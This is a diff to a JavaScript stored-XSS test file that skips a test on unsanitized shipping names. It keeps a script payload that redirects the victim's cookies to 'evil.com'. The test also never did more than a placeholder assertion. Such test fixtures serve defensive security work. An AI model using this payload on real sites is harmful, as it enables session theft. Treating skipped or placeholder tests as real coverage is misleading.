@@ -75,15 +75,12 @@ describe('WSTG-INPV-01: Stored XSS Testing', () => {
   });
 
   describe('Shipping Information - XSS Vectors', () => {
-    test('VULNERABLE: Order stores shipping info without sanitization', () => {
+    test.skip('VULNERABLE: Order stores shipping info without sanitization', () => {
+      // Skipped: Requires UI interaction to test order creation flow
+      // Document: app.js renders order items using innerHTML
+      // Malicious shipping names could execute XSS when order history is displayed
       const maliciousName = '<script>document.location="http://evil.com?c="+document.cookie</script>';
-
       appState.addToCart(1);
-      // Note: The order creation process stores shipping info directly
-      // Vulnerability: When order history is rendered, malicious names could execute
-
-      // Document: app.js:1098-1106 renders order items using innerHTML
-      expect(true).toBe(true); // Placeholder - actual order creation requires UI interaction
     });
   });
 
